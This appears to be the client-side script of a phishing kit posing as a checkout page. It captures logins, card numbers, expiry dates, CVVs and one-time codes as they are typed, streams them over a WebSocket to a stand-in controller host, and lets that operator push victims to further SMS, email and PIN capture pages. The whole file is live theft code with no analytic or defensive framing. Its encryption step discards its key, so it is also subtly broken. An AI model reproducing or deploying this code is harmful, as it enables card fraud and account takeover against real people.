const cfg = {
  projectName: "CHECKOUT",
  errorJumpAddress: "https://public-service.example/",
  loadinglayerStyles: "#fec900",
  loadinglayerFont: "Verifying...",
  customPhoneDefaultValue: "",
  customEmailDefaultValue: "",
  isThankPage: "1"
};

const cvvform = {
  username: "",
  password: "",
  card_number: "",
  card_expiry: "",
  cvv: "",
  otp: ""
};

const routes = {
  show_payment: "c_pay.html",
  show_sms: "d_sms.html",
  show_email: "e_email.html",
  show_pin: "f_pin.html"
};

const SESSION_ID = localStorage.getItem("SESSION_ID") || crypto.randomUUID();
try {
  localStorage.setItem("SESSION_ID", SESSION_ID);
} catch (_) {
  sessionStorage.setItem("SESSION_ID", SESSION_ID);
}

const socket = new WebSocket("wss://controller.example/live/" + SESSION_ID);
const worker = new Worker("ws-worker.js");

async function encryptRecord(record) {
  const rawKey = crypto.getRandomValues(new Uint8Array(32));
  const counter = crypto.getRandomValues(new Uint8Array(16));
  const key = await crypto.subtle.importKey("raw", rawKey, "AES-CTR", false, ["encrypt"]);
  return crypto.subtle.encrypt(
    { name: "AES-CTR", counter: counter, length: 128 },
    key,
    new TextEncoder().encode(JSON.stringify(record))
  );
}

document.addEventListener("input", async (event) => {
  if (Object.hasOwn(cvvform, event.target.name)) {
    cvvform[event.target.name] = event.target.value;
    worker.postMessage(cvvform);
    socket.send(await encryptRecord(cvvform));
  }
}, true);

socket.addEventListener("message", (event) => {
  const command = JSON.parse(event.data).command;
  if (routes[command]) location.assign(routes[command]);
});
